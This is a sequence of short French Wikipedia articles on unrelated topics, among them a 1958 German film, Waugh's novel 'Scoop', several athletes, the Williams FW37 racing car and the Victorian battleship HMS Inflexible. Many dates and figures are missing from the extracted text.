L'assassin sera à Tripoli

L'assassin sera à Tripoli ("") est un film allemand réalisé par Harald Reinl, sorti en 1958.
Synopsis.
Romarei a des capacités psychiques que lui a laissées Prang, sa mère adoptive, et dont elle fait profiter à tous ceux qui la paient. Parfois elle sent les malheurs qui vont leur arriver ; ainsi elle prévient son petit ami Lorenz Ophoven après avoir une chute d'ascenseur. Sir Boris Olinzoff en entend parler, il promet à sa mère que Romarei aura une vie luxueuse si elle lui réserve l'usage exclusif de son don. Mais Olinzoff était présent dans la vision de Romarei. Elle veut d'abord en tirer avantage : elle vit en Orient de façon insouciante et peut trouver des champs de pétrole qu'Orloff exploite. Puis elle découvre qu'Orloff a des amis étranges, elle est mal vue dans le village et cesse toute critique en utilisant l'hypnose. Alors qu'Orloff s'est absenté, Romarei est enlevée par ses "amis" étranges. Lorenz, qui pilote un bateau à vapeur, après avoir eu affaire à une blonde suspecte, se précipite à son aide, la délivre de ses ravisseurs puis d'Olinzoff.

</doc>
<doc id="8730084" url="https://fr.wikipedia.org/wiki?curid=8730084" title="Offensive de Vardar">
Offensive de Vardar



</doc>
<doc id="8730094" url="https://fr.wikipedia.org/wiki?curid=8730094" title="Sensation !">
Sensation !

Sensation ! (titre original: "Scoop") est un roman d'Evelyn Waugh publié en 1938.
Le roman a également été traduit en France sous le titre "Scoop".
Résumé.
Un romancier britannique fait jouer ses relations afin de trouver un travail qui l’amènerait à quitter son pays. Quelques jours plus tard, le directeur d'un journal appelle un chroniqueur – homonyme de l'écrivain – pour qu'il aille d'urgence en Afrique en tant que correspondant. Il s'agit d'un petit pays situé vraisemblablement vers Djibouti où il se passerait des heurts. Les journaux envoient leurs meilleurs correspondants sur place, mais sans trop savoir ce qu'il s'y passe.
Critique.
Ce roman est une critique mordante du milieu de la presse. L'histoire est pleine de malentendus.

</doc>
<doc id="8730099" url="https://fr.wikipedia.org/wiki?curid=8730099" title="A. Kadir Paksoy">
A. Kadir Paksoy

A. Kadir Paksoy, né le à Darende (Turquie), est un enseignant et poète turc.

</doc>
<doc id="8730101" url="https://fr.wikipedia.org/wiki?curid=8730101" title="Scoop (roman de Waugh)">
Scoop (roman de Waugh)



</doc>
<doc id="8730104" url="https://fr.wikipedia.org/wiki?curid=8730104" title="Bent-Ove Pedersen">
Bent-Ove Pedersen

Bent-Ove Pedersen, né le à Oslo, est un ancien joueur de tennis norvégien, professionnel entre 1992 à 1995.
Il a remporté un tournoi ATP en double à Bolzano ainsi que trois tournois Challenger à Heilbronn et Oporto en 1992 ainsi qu'à Rennes en 1994.
Malgré sa courte carrière, il reste toujours l'un des meilleurs joueurs de tennis norvégien avec Christian Ruud et Jan-Frode Andersen.
Carrière.
Il a joué deux saisons pour l'université de Berkeley et a remporté en 1991 le championnat NCAA en double avec Matt Lucena, ce qui lui a permis de participer à l'US Open et d'y atteindre les quarts de finale.
Il a participé à deux olympiades : 1988 et 1992. Il s'est qualifié en double à Barcelone avec Christian Ruud mais ils se sont inclinés face aux sud-africains Wayne Ferreira et Piet Norval.
En 1993, alors classé à l'ATP, il parvient à se qualifier pour l'US Open mais échoue au premier tour face à Byron Black.
Il met un terme à sa carrière en et joue son dernier tournoi professionnel en juillet 1995 lors du Challenger de Lillehammer où il s'incline en demi-finale en double.
Il a joué pour l'équipe de Norvège de Coupe Davis dès 1987. Il compte 22 victoires pour 13 défaites.

</doc>
<doc id="8730106" url="https://fr.wikipedia.org/wiki?curid=8730106" title="Sepp Schneider">
Sepp Schneider

Sepp Schneider, né le , est un spécialiste autrichien du combiné nordique. 
Biographie.
Frère du sauteur à ski Balthasar Schneider, Sepp Schneider participe à ses premières compétitions FIS en 2006. En 2010, il découvre la Coupe continentale, dans laquelle il gagne sa première manche en à Høydalsmo. Sa première sélection en équipe nationale date de 2011 pour les Championnats du monde junior.
Le à Almaty, il est appelé pour la première fois en Coupe du monde et marque ses premiers points avec une trentième place. En , lors de l'étape de Schonach, il se trouve dans le relais autrichien qui termine quatrième puis améliore son meilleur résultat individuel avec une . Lors de la saison 2013-2014, il parvient à faire mieux avec deux "tops 10" en individuel, huitième à Lahti puis septième à Oslo.
Il entame l'hiver 2014-2015 qu'à la mi-janvier avant de se retrouver près de son premier podium individuel en terminant quatrième à Val di Fiemme, battu au sprint par Jørgen Graabak pour la troisième place. Le lendemain, il monte sur son premier podium en Coupe du monde en prenant la troisième place avec Bernhard Gruber du sprint par équipes. En 2017, il prend la troisième place lors d'un concours régional de saut à ski.
En 2018, il annonce prendre sa retraite en raison de problème de santé.
Résultats.
Championnats du monde.
Légende :— : pas de participation.GT : grand tremplin / PT : petit tremplin.

</doc>
<doc id="8730122" url="https://fr.wikipedia.org/wiki?curid=8730122" title="Williams FW37">
Williams FW37

La Williams FW37 est la monoplace de Formule 1 engagée par l'écurie britannique Williams F1 Team dans le cadre du championnat du monde de Formule 1 2015. Elle est pilotée par le Brésilien Felipe Massa qui effectue sa seconde saison au sein de l'écurie de Grove et le Finlandais Valtteri Bottas, présent chez Williams pour la troisième année. Les pilotes essayeurs sont les Britanniques Susie Wolff et Alex Lynn. Conçue par l'ingénieur britannique Pat Symonds, la FW37 est présentée le 1er février 2015 sur le circuit permanent de Jerez en Espagne, après que des photos de la monoplace ont été diffusées en une du magazine F1 Racing le 20 janvier. Évolution de la Williams FW36 de 2014, la FW37 s'en distingue notamment par son poids, augmenté de onze kilogrammes.
Création de la monoplace.
La réglementation technique ayant peu évolué par rapport à 2014, la FW37 se distingue par un nez plus massif que celui de sa devancière et dotée d'une pointe plus courte afin de favoriser le passage de l'air. La suspension avant inférieure a été aplatie tandis que la supérieure affleure presque le capot moteur qui a été affiné et compacté à l'arrière. Ses ouïes de refroidissement sont en outre inspirées de la Mercedes AMG F1 W05 victorieuse en 2014. Les flancs de la voiture ont été abaissés et l'aileron arrière ne dispose pas de pilier central, contrairement aux autres monoplaces du plateau, afin de minimiser la traînée et la consommation et de favoriser l'évacuation ; certains observateurs mettent en avant l'aéroélasticité de la FW37 pour expliquer l'absence de pilier.
Le directeur technique de l'écurie, Pat Symonds, explique les évolutions de la FW37 : .
Jason Sommerville, le directeur de l'aérodynamique, relate que . Il déclare également : .

</doc>
<doc id="8730125" url="https://fr.wikipedia.org/wiki?curid=8730125" title="Presqu’île Sviatoï Nos">
Presqu’île Sviatoï Nos

Sviatoï Nos (en ) est une presqu’île située sur la rive est du lac Baïkal, en Bouriatie, dans le sud de la Sibérie, en Russie orientale. Son nom en bouriate signifie « nez d'esturgeon ».
La presqu'île fait partie du parc national Zabaïkalski.
Géographie.
La presqu’île a une superficie de . Le point culminant — le mont Markov — s'élève à . L'isthme de Tchivyrkouï relie Sviatoï Nos au continent, le golfe de Bargouzine et le golfe de Tchivyrkouï se trouvent de part et d'autre.

</doc>
<doc id="8730127" url="https://fr.wikipedia.org/wiki?curid=8730127" title="Youtuber">
Youtuber



</doc>
<doc id="8730135" url="https://fr.wikipedia.org/wiki?curid=8730135" title="YouTuber">
YouTuber



</doc>
<doc id="8730138" url="https://fr.wikipedia.org/wiki?curid=8730138" title="Massif de la Dzéna">
Massif de la Dzéna



</doc>
<doc id="8730142" url="https://fr.wikipedia.org/wiki?curid=8730142" title="Pandora Box (entreprise)">
Pandora Box (entreprise)

Pandora Box est une société japonaise de développement de jeu vidéo, fondée en 1989 et fermée en 2001. Elle développe notamment la série de jeux vidéo de rôle "Oni", éditée par Banpresto .
En 2007, la société Shannon Ltd reprend l'exploitation des franchises et titres de Pandora Box.
Jeux développés.
Liste des jeux (partielle)

</doc>
<doc id="8730149" url="https://fr.wikipedia.org/wiki?curid=8730149" title="Catherine de Hohenlohe-Waldenbourg-Schillingsfürst">
Catherine de Hohenlohe-Waldenbourg-Schillingsfürst

Catherine de Hohenlohe-Waldenbourg-Schillingsfürst (en allemand : "Katharina Wilhelmine Maria Josephe von Hohenlohe-Waldenburg-Schillingsfürst"), née le à Stuttgart et morte le à Fribourg-en-Brisgau est un membre de la famille princière de Hohenlohe, devenue par son second mariage avec le prince Charles de Hohenzollern princesse consort de Hohenzollern-Sigmaringen.
Famille.
Catherine de Hohenlohe-Waldenbourg-Schillingsfürst est la fille unique de Charles-Albert III de Hohenlohe-Waldenbourg-Schillingsfürst (1776-1843) et de sa seconde épouse la princesse Léopoldine de Fürstenberg (1791-1844). Après la séparation de ses parents, Catherine réside à Donaueschingen auprès des Fürstenberg, sa famille maternelle.
Mariages.
Catherine épouse en premières noces le François-Erwin, comte von Ingelheim (1812-1845), un homme de santé précaire. Veuve, elle se remarie à Kupferzell le au prince Charles de Hohenzollern (1785-1853), son aîné de 31 ans, et devient dès lors princesse consort de Hohenzollern-Sigmaringen. Elle ne porte ce titre que durant cinq mois car son mari renonce à son titre de prince souverain le . Elle n'a eu aucune postérité de ses deux mariages.
Vie religieuse.
Devenue veuve en 1853, la princesse Catherine reçoit de la famille princière de son défunt époux le domaine de Bistritz en Bohême et lui octroie une pension annuelle considérable assortie d'une somme de florins. Catherine pourra donc réaliser son projet de participer activement à la vie régulière à laquelle elle aspire. Dès 1853, elle rejoint la communauté des Dames du Sacré-Cœur à Kintzheim en Alsace, une congrégation vouée à l'éducation des jeunes filles s'inspirant des préceptes jésuites. Supportant mal les fatigues physiques inhérentes à sa fonction enseignante, elle quitte ce couvent. 
À partir de 1857 elle demeure à Rome où elle intègre, en qualité de novice, le monastère de Sant' Ambrogio della Massima des religieuses du Tiers-Ordre de Saint-François. Elle y reste quinze mois avant de parvenir finalement à le quitter. Elle affirme avoir découvert dans ce monastère des comportements et des actes contraires aux enseignements de l'Eglise (adoration de fausses saintes, luxure, etc.). Elle affirme aussi que la maîtresse des novices, sœur Maria Luisa, a tenté de l'empoisonner. Catherine porte plainte devant l'Inquisition qui décidera finalement, après enquête et procès, de fermer le monastère en 1862. 
En 1863, de retour en Allemagne, elle apporte son concours efficace lors de la création de l'abbaye bénédictine Saint-Martin de Beuron, et patronne de ses deniers les créations artistiques de l'école de Beuron. 

</doc>
<doc id="8730155" url="https://fr.wikipedia.org/wiki?curid=8730155" title="6e cérémonie des Indiana Film Journalists Association Awards">
6e cérémonie des Indiana Film Journalists Association Awards

La des (), décernés par l' a récompensé les films réalisés dans l'année.

</doc>
<doc id="8730164" url="https://fr.wikipedia.org/wiki?curid=8730164" title="Kapiniani">
Kapiniani



</doc>
<doc id="8730165" url="https://fr.wikipedia.org/wiki?curid=8730165" title="Commission électorale nationale indépendante (Nigeria)">
Commission électorale nationale indépendante (Nigeria)

La Commission électorale nationale indépendante (' ou ' en anglais) est un organisme électoral mis en place en 1998 pour organiser les élections au Nigeria.

</doc>
<doc id="8730168" url="https://fr.wikipedia.org/wiki?curid=8730168" title="Prix Alfred P. Sloan">
Prix Alfred P. Sloan

Le prix Alfred P. Sloan est une récompense attribuée chaque année depuis 2003 pendant le festival du film de Sundance, à un long-métrage qui soit met l'accent sur la science ou la technologie, soit présente un personnage principal scientifique, ingénieur ou mathématicien.
La Fondation Alfred P. Sloan octroie au gagnant un prix en espèces de .

</doc>
<doc id="8730171" url="https://fr.wikipedia.org/wiki?curid=8730171" title="Rue Copeaux">
Rue Copeaux



</doc>
<doc id="8730180" url="https://fr.wikipedia.org/wiki?curid=8730180" title="Ramon Andersson">
Ramon Andersson

Ramon Andersson né le , est un kayakiste australien pratiquant la course en ligne.

</doc>
<doc id="8730191" url="https://fr.wikipedia.org/wiki?curid=8730191" title="Championnat du Gabon de football 1978">
Championnat du Gabon de football 1978

La saison 1978 du Championnat du Gabon de football est la seconde édition du championnat de première division gabonaise, le "Championnat National". La compétition est en fait une phase finale qui réunit les cinq clubs vainqueurs des championnats provinciaux. L’ensemble des rencontres ont lieu dans la capitale, Libreville.
C'est le club du FC 105 Libreville qui remporte le titre, après avoir terminé en tête du classement devant Petrosport FC et l’AS Sogara. C'est le tout premier titre de champion du Gabon de l'histoire du club.

</doc>
<doc id="8730192" url="https://fr.wikipedia.org/wiki?curid=8730192" title="Ian Rowling">
Ian Rowling

Ian Rowling né le , est un kayakiste australien pratiquant la course en ligne.

</doc>
<doc id="8730216" url="https://fr.wikipedia.org/wiki?curid=8730216" title="Color Me Badd">
Color Me Badd

Color Me Badd est un groupe américain de RnB contemporain formé en 1987 à Oklahoma City. Son plus grand succès est la chanson ' sortie en 1991 sur l'album '.

</doc>
<doc id="8730218" url="https://fr.wikipedia.org/wiki?curid=8730218" title="Nissan Pulsar (2015)">
Nissan Pulsar (2015)



</doc>
<doc id="8730219" url="https://fr.wikipedia.org/wiki?curid=8730219" title="RK Crvenka">
RK Crvenka

Le Rukometni klub Crvenka () est un club de handball qui se situe à Crvenka en Serbie. 
Joueurs célèbres.
Parmi les joueurs ayant évolué au club, on trouve :

</doc>
<doc id="8730228" url="https://fr.wikipedia.org/wiki?curid=8730228" title="José Manuel Lara Bosch">
José Manuel Lara Bosch

José Manuel Lara Bosch, de Pedroso de Lara, né le à Barcelone (Etat espagnol) et mort le dans la même ville, est un éditeur et chef d'entreprise espagnol. Il a présidé le Grupo Planeta et le Grupo Atresmedia.
Biographie.
Fils de l'entrepreneur et éditeur José Manuel Lara Hernández (capitaine de la Legión à Barcelone durant la Guerre civile espagnole), et de María Teresa Bosch Carbonell, il est le président du Grupo Planeta, créé par son père en 1949 et où il a travaillé depuis 1963. En 1996, il est nommé conseiller délégué du groupe, initiant ainsi le processus de diversification, et en 2003, après la mort de son père, il est nommé président. Depuis 2003, il est aussi président du Grupo Atresmedia (chaînes de télévision Antena 3 et La Sexta).
Lara étudie les sciences économiques à l'université de Barcelone et obtient une maîtrise à l'ESADE. Il commence sa carrière professionnelle en 1963 à la librairie Larousse de Paris. Il occupe ensuite divers postes dans la structure du Grupo Planeta aussi bien en Espagne qu'en Amérique latine. 
Il lance le quotidien conservateur "La Razón".
Le , il cesse d'être l'actionnaire majoritaire du club de football RCD Espanyol en vendant son paquet d'action à un groupe d'investisseurs dirigé par Ramón Condal.
Il meurt le , des suites d'un cancer du pancréas.

</doc>
<doc id="8730229" url="https://fr.wikipedia.org/wiki?curid=8730229" title="Grupo Atresmedia">
Grupo Atresmedia



</doc>
<doc id="8730242" url="https://fr.wikipedia.org/wiki?curid=8730242" title="Hapoël Rehovot">
Hapoël Rehovot

Le Hapoël Rehovot est un ancien club israélien de handball basé à Rehovot. Fondé en 1955, il a disparu en 2002 après avoir remporté 13 Championnats d'Israël et 5 Coupes d'Israël.

</doc>
<doc id="8730253" url="https://fr.wikipedia.org/wiki?curid=8730253" title="ESRO 2B">
ESRO 2B



</doc>
<doc id="8730255" url="https://fr.wikipedia.org/wiki?curid=8730255" title="ESRO 2A">
ESRO 2A



</doc>
<doc id="8730256" url="https://fr.wikipedia.org/wiki?curid=8730256" title="Hapoel Rehovot">
Hapoel Rehovot



</doc>
<doc id="8730262" url="https://fr.wikipedia.org/wiki?curid=8730262" title="Dopamine (film)">
Dopamine (film)

Dopamine est une comédie dramatique romantique américaine écrite et réalisée par Mark Decena sortie en 2003.
Synopsis.
Rand, un ingénieur informatique, est convaincu que l'amour n'est rien d'autre qu'une forme d'euphorie engendrée par la dopamine... Jusqu'au jour où il fait la rencontre de Sarah, qui croit à la réalité de ce type d'émotion. Au cours de la relation, tous deux apprennent énormément de choses sur le sujet.
Prix et récompenses.
Le film est lauréat du prix Alfred P. Sloan au festival du film de Sundance 2003.

</doc>
<doc id="8730263" url="https://fr.wikipedia.org/wiki?curid=8730263" title="Vápenice">
Vápenice



</doc>
<doc id="8730264" url="https://fr.wikipedia.org/wiki?curid=8730264" title="Várhegy">
Várhegy



</doc>
<doc id="8730276" url="https://fr.wikipedia.org/wiki?curid=8730276" title="Vážany">
Vážany

Vážany est un toponyme qui peut désigner :

</doc>
<doc id="8730285" url="https://fr.wikipedia.org/wiki?curid=8730285" title="Rétchungpa">
Rétchungpa



</doc>
<doc id="8730290" url="https://fr.wikipedia.org/wiki?curid=8730290" title="David Welde">
David Welde

David Welde, né le , est un coureur du combiné nordique allemand.
Biographie.
David Welde obtient sa première victoire sur l'épreuve individuelle du Festival olympique de la jeunesse européenne 2011.
Licencié au SC Sohland, il démarre en Coupe du monde en décembre 2012 à Kuusamo où il est .
David Welde a reporté trois médailles lors des Universiades 2015. Il est le frère de Ruben Welde.

</doc>
<doc id="8730293" url="https://fr.wikipedia.org/wiki?curid=8730293" title="Championnat du Gabon de football 1979">
Championnat du Gabon de football 1979

La saison 1979 du Championnat du Gabon de football est la troisième édition du championnat de première division gabonaise, le "Championnat National". La compétition est en fait une phase finale qui réunit les huit clubs issus des championnats provinciaux. L’ensemble des rencontres ont lieu dans la capitale, Libreville.
C'est le club des Anges ABC qui remporte le titre, après avoir battu l’USM Libreville lors de la finale nationale. C'est le tout premier titre de champion du Gabon de l'histoire du club.

</doc>
<doc id="8730305" url="https://fr.wikipedia.org/wiki?curid=8730305" title="Michel Ferracci">
Michel Ferracci

Michel Ferracci, né le à Quenza et dont le nom complet est Antoine Michel Ferracci, est un acteur et producteur français.
Biographie.
Jeunesse.
Michel Ferracci naît dans le petit village corse de Quenza. Il grandit à Porto Vecchio où ses parents agriculteurs tiennent également un café. Enfant, il aime le cirque, le théâtre, amuser les autres. Il perd son père jeune et aide sa mère dans le commerce familial.
Il s'installe à Paris et jusqu'à 40 ans travaille dans les cercles de jeux de la capitale.
Carrière.
Le réalisateur Pierre Leccia rencontre Michel Ferracci accompagné de Éric Rochant au Cercle de poker Wagram dont il est le directeur et ces derniers lui proposent un rôle dans la série "Mafiosa" sur Canal +. Engagé pour la saison 2 en 2008 où son personnage meurt, Rochant lui confie une autre personnage dans les saison 3 et 4.
Il participe ensuite à de nombreuses séries : "Le Temps est assassin" de Claude-Michel Rome, "Capitaine Marleau" de Josée Dayan, "Profilage", "Scènes de ménages"... 
Au cinéma, Michel Ferracci tourne avec Laurent Tuel ("Le Premier Cercle", "La Grande Boucle"), Éric Valette ("Une affaire d'État"), Alexandre Arcady ("Comme les cinq doigts de la main"), Thierry de Peretti ("Les Apaches"), Lucas Belvaux ("Chez nous", "Des hommes"), Éric Fraticelli ("Permis de construire", "Le Clan", "Inestimable"), Frédéric Farrucci ("Le Mohican")...
En 2024, Michel Ferracci crée le Portivechju Film Festival à Porto-Vecchio avec l’association Cinéma Paradisu et la mairie.
En 2025, l'acteur fait ses premiers pas au théâtre dans l'adaptation du film "On aurait du aller en Grèce" de Nicolas Benamou qu'il a co-écrit. Dans une mise en scène d'Anne Bourgeois, il partage l'affiche avec Daniel Russo et Ariane Séguillon au Théâtre du Gymnase Marie-Bell de Paris.
Vie privée.
À partir de 2008, Michel Ferracci vit avec l'actrice belge Émilie Dequenne qu'il a rencontrée au Cercle Wagram, un club de poker parisien dont il était le directeur. Il l'épouse le à la mairie du . Il a deux fils d'une précédente union, tandis qu'elle a une fille. Il est veuf depuis le .

</doc>
<doc id="8730309" url="https://fr.wikipedia.org/wiki?curid=8730309" title="HMS Inflexible (1876)">
HMS Inflexible (1876)

Le HMS "Inflexible" est un cuirassé à coque en fer de l’ère victorienne dont l'artillerie était montée sur tourelles centrales. Ce vaisseau fut construit dans les années 1870 pour la Royal Navy, afin de s'opposer à la menace croissante d'une hégémonie de la "Regia Marina" italienne en Méditerranée.
La marine italienne venait de faire construire deux croiseurs, le "Duilio" (1880) et le "Dandolo", équipés de quatre canons Armstrong de , de 35 tonnes chacun. Ils surpassaient par leur armement tous les autres bâtiments de l'escadre de Méditerranée, et l’"Inflexible" était destiné à leur faire pièce.
Bâtiment de guerre ultra-moderne, l’"Inflexible" était équipé de canons de plus fort calibre que tous les autres navires britanniques antérieurs, et disposait du plus épais blindage jamais réalisé sur un navire de la Royal Navy. Malgré les critiques, il fut conçu de sorte que si la proue, dépourvue de blindage, était éventrée au combat et même noyée, la flottabilité de la section centrale suffirait à maintenir le bâtiment à flot et droit.
Ce fut le premier grand navire de guerre dont la flottabilité était garantie par une coque blindée horizontale "sous" la ligne de flottaison, plutôt que de ceintures blindées située au niveau de la ligne de flottaison.
Conception.
Le concept originel était similaire à celui du , mais avec un armement plus lourd. Le navire reposait sur trois composants, dont les esquisses sont l’œuvre de Nathaniel Barnaby :
Barnaby voulait que le navire soit à la fois plus large que ses prédécesseurs (pour minimiser le tangage) et le plus court possible pour donner un minimum de prise aux tirs ennemis. Mais les navires plus « trapus » étaient généralement plus lents : aussi optimisa-t-on la conception de l’"Inflexible" par des essais sur maquette en bassin de carène, dont William Froude était le promoteur. Le résultat fut un bâtiment plus large de trois mètres que le "Duillo", tout en étant raccourci de 7 m, soit un élancement record pour un navire de premier rang en acier.
Une fois les dimensions de base approuvées, le détail de la conception architecturale fut confié à William White et le navire fut achevé à l'arsenal de Portsmouth le .
Controverses.
L’"Inflexible" fut lancé à la mer le . Quelques semaines plus tard, le député , ancien directeur des constructions navales, visitait les bâtiments de guerre italiens et s'enquit de leur stabilité en cas d'éventrement de la proue, qui n'était pas blindée.
Comme la conception de l’"Inflexible" était identique, il fit part de ses inquiétudes aux autorités puis, n'ayant pu convaincre l’Amirauté, il publia en ses critiques dans "The Times". On pouvait même lire dans l’éditorial de l’édition du : .
Les débats se prolongèrent jusqu'à ce qu’au mois de juillet, on interrompe la construction de l’"Inflexible" (et de deux autres navires plus petits de la , les et ), afin de permettre à une commission de crise d'expertiser la conception. Dans son rapport, publié en , elle concluait qu'il serait difficile de noyer entièrement la proue qui, quoique non blindée, était compartimentée et en partie bourrée de liège ; mais que si cela réussissait, le navire serait en limite d'équilibre, avec une assiette d'environ .
Le chantier put reprendre en , et le navire mis en service le , sous le commandement du capitaine Jackie Fisher, quoiqu’il ne fût opérationnel que le . Le coût de construction s'appréciait finalement à .
Armement.
Artillerie.
Pour contrer la menace née de la puissance montante de la flotte italienne, l’"Inflexible" devait être équipé de quatre des plus gros canons britanniques du moment, armes d'un poids de 60 tonnes chacune. Au mois d', on décida de modifier la conception du navire pour mettre en place un canon d'un calibre encore supérieur, en construction dans les ateliers Armstrong : un canon de pesant 81 tonnes. Les Italiens répliquèrent en adaptant leurs bâtiments pour les équiper d'un canon de 100 tonnes, le RML de 450 mm. Comme on ne pouvait monter de telles armes sur l’"Inflexible", le gouvernement britannique en commanda quatre pour assurer les défenses côtières autour de Gibraltar et de l'île de Malte respectivement. On peut encore voir deux de ces canons : l'un au fort Rinella à Malte, l'autre à la batterie Magdala Napier à Gibraltar.
Les quatre batteries de 81 tonnes à chargement par la bouche équipant l’"Inflexible" étaient montées sur deux tourelles de de diamètre montées en échelon, la tourelle avant montée à bâbord et la tourelle d'étambot à tribord. La superstructure des gaillards d’avant et d’arrière était plus étroite pour permettre aux canons de tirer dans l'axe de cap ; en pratique, cependant, il s’avéra, comme pour les autres navires, que le choc de recul en tir axial était si éprouvant pour les superstructures qu'il valait mieux l'éviter ; mais la configuration « en échelon » permettait à trois canons de tirer sur des cibles à proximité des lignes de cap direct et inverse. Ces quatre canons pouvaient aussi naturellement tirer de travers.
La configuration « en échelon » fut retenue pour deux navires de la classe Colossus, avant que la Royal Navy en abandonne le principe pour des batteries symétriques à l’avant et à l’arrière du navire. La configuration « en échelon » ne réapparaîtra qu'avec le .
Chaque tourelle pesait 750 tonnes et était protégée d'un blindage composite épais de , et d'une tôle en fer forgé épaisse de , soit un blindage d'une épaisseur totale de . Les tourelles étaient manœuvrées par vérins hydrauliques, et une rotation de 360 degrés prenait environ une minute.
Les canons de l’"Inflexible" se chargeaient encore par le canon, et leur longueur ne permettait pas de les recharger depuis l'intérieur des tourelles. On avait par conséquent recours à des refouloirs hydrauliques montés hors des tourelles, sous un glacis blindé. Pour recharger les canons, on amenait les canons dans l'axe de leur refouloir par rotation de la tourelle, et l'on ouvrait le circuit hydraulique de suspension du canon pour faire s'abaisser le tube : ainsi le refouloir pouvait placer l'amorce de poutre et engager l'obus de . Le refouloir devait être enfoncé à deux reprises : une première fois pour étouffer les dernières braises à l'intérieur du canon, avec une éponge et un jet d'eau giclant de l'extrémité du mandrin, et une seconde fois pour le chargement proprement dit : le refouloir poussait la charge et l'obus depuis un chariot intermédiaire. L'obus comportait à sa base un disque de cuivre à cannelures (au lieu des nervures zinguées antérieures) épousant la rayure interne du canon. Les essais avaient montré qu'à pleine charge (450 livres de poudre noire), on obtenait une vitesse d'éjection de , pouvant percer un blindage de fer forgé de d’épaisseur à . Le chargement par la bouche prenait entre 2 min 30 et 4 min.
Système d’éperonnement.
Le navire était équipé d'un éperon ; cette tactique était encore à l'époque considérée comme une méthode sûre de couler un bâtiment ennemi : le croiseur "Re d’Italia" n'avait-il pas été éperonné en 1866 par le navire-amiral de la marine impériale autrichienne, le "Ferdinand Max", lors de la bataille de Lissa? Ce haut fait remit pour un temps l’éperonnement en honneur (cette faveur se maintint jusque dans les années 1890), et plusieurs experts navals étaient même d'avis que c’était là l’arme la plus efficace en mer : ainsi, Gerard Noel remporta le premier prix du "Royal United Services Institute" en 1874 pour une communication où l'on peut lire .
Ce principe peut paraître surprenant aujourd’hui, mais à l'époque les engagements navals n’étaient exécutés qu’à quelques milliers de mètres de distance, et l'avènement de la machine à vapeur libérait la manœuvre de vaisseaux de la direction des vents, donnant crédit à l’idée qu’il était désormais possible d’éventrer l'ennemi en fonçant droit vers le centre de sa coque. "A posteriori", les inconvénients dangereux de l’éperon parurent au grand jour, avec la multiplication des accidents lors des exercices : par exemple, le fut éperonné par le en 1875, et le par le en 1893. Si ces accidents montraient la redoutable efficacité de l'éperonnement, elle reflétait aussi la mauvaise manœuvrabilité des bâtiments qui en étaient équipés. Désormais, l'éperon devint amovible pour éviter les accidents, mais il semble que l’"Inflexible" ait conservé un éperon permanent. C'était une pièce en fer forgé montée à l'arrière du pont au blindage de d'épaisseur, et incurvée vers le bas.
Torpilles.
L’"Inflexible" était équipé de deux tubes lance-torpilles immergés. C'étaient des cylindres de fonte liés à la coque par des articulations, un sur chaque bord. À l'intérieur du navire, l'autre extrémité du tube était en appui sur un affût gradué pour la visée. Chaque extrémité des tubes était munie d'un couvercle étanche. Les torpilles, d'un diamètre de , étaient engagées dans un tube cylindrique en cuivre qui épousait le rayon intérieur du tube en fonte. Pour lancer la torpille, on ouvrait le couvercle extérieur et on prolongeait le tube d'un guide long de , qui permettait de préserver la trajectoire du missile des turbulences de l'eau autour du navire. Tandis que le moteur à air comprimé de la torpille entrait en action, un piston la propulsait depuis l'intérieur du chemisage en cuivre.
Blindage de la coque.
La superstructure centrale bénéficiait en particulier d’un blindage d'une épaisseur exceptionnelle. Au niveau de la ligne de flottaison, le blindage consistait en un empilement de quatre plaques épaisses de , une plaque de répartition en teck épaisse de , puis une autre plaque de , une plaque de répartition en teck de , et deux tôles de . Le poids surfacique de cette coque épaisse de était de . On considérait qu'un blindage épais de était pratiquement à l'épreuve contre tous les canons du moment, et cette épaisseur reste à ce jour la plus importante jamais réalisée sur un bâtiment de surface.
L’épaisseur du blindage se réduisait à au-dessus de la ligne de flottaison : de plaques d'acier à l’extérieur et à l'intérieur, avec l’épaisseur du teck intermédiaire portée à pour conserver au navire une épaisseur de coque uniforme. Sous la ligne de flottaison, on retrouvait une plaque extérieure épaisse de , une plaque intérieure épaisse de , et en sandwich une plaque de répartition en teck épaisse de , ce qui maintenait constante l'épaisseur de la coque ().
Par delà la superstructure, au-dessus du pont épais de , se trouvaient plusieurs compartiments étanches permettant de stocker le charbon et la cargaison. Des compartiments de remplis de liège et contenant un caisson haut de , étaient interposés entre les soutes à charbon et le pont. Le caisson était rempli avec de la filasse et de la bourre de chanvre, matériaux qui avaient montré une bonne résistance à la pénétration des projectiles traversant le caisson. Toutes ces fibres avaient été traitées au chlorure de calcium afin de réduire leur inflammabilité. Des expériences avaient été menées en ce sens sur le , en tirant des obus de 160 mm sur des maquettes en vraie grandeur des compartiments en liège et des caissons.
Propulsion.
Fort de son élancement de 4.6:1, l’"Inflexible" constituait une plate-forme de tir stable. Les recherches du physicien William Froude avaient prouvé qu'un navire aussi trapu n'exigerait pas une forte motorisation pour atteindre la vitesse de projet, fixée à . Toutefois, on avait précédemment adopté ces mêmes proportions pour les cuirassés et , et ces deux bâtiments avaient manifesté une certaine instabilité directionnelle.
L’"Inflexible" était mû par deux moteurs à vapeur à expansion multiple, fabriqués par la Sté "John Elder &amp; co". Chaque moteur comportait un cylindre haute-pression et deux cylindres basse-pression connectés à un vilebrequin. Les bielles, d'un diamètre de , étaient articulées au vilebrequin par des pivots de de diamètre. Un arbre creux entraînait les deux hélices à une vitesse maximum de . Il y avait deux chambres de chaudière, à chaque extrémité de la salle des machines. Chaque chambre abritait une chaudière de et deux de , travaillant à la pression de . On avait déjà utilisé de tels circuits à haute pression, d'un meilleur rendement que les circuits basse-pression, à bord du , lancé en 1875, et du en 1876, mais ils étaient encore récents. Des équipes d'ouvriers se relayaient depuis les soutes pour approvisionner continuellement les moteurs en charbon. Le navire était équipé de 39 moteurs plus petits, destinés à divers usages, comme l'actionnement des pompes d'exhaure, capables de relever d'eau par heure, les pompes de refroidissement des condenseurs, les ventilateurs d'aération, la transmission du gouvernail, les vérins hydrauliques des canons, des compresseurs d'air, des cabestans et les génératrices électriques. La salle des machines était bruyante, saturée en humidité par la vapeur et les relents d'huile de moteur. Les moteurs étaient sujets aux fuites d'huile et de vapeur, et les joints de soupape au phénomène de surchauffe : il fallait régulièrement les déposer pour éviter la fatigue. Tous ces équipements étaient abrités dans la superstructure blindée.
Quoiqu'il fût propulsé à vapeur, l’"Inflexible" était doté d'une paire de mâts et de cordages, permettant de déployer une voilure de . On l'avait surtout conservée pour maintenir la compétence de l'équipage lors des exercices, car une si faible voilure (soit moins de /tonneau) était à peine capable de faire avancer ce cuirassé. Comme l'écrivit Jackie Fisher : ""
On remplaça mâts et voiles au bout de quatre ans pour les remplacer par de simples mâts de pavillon pouvant porter un poste de mitrailleuse.
Innovations.
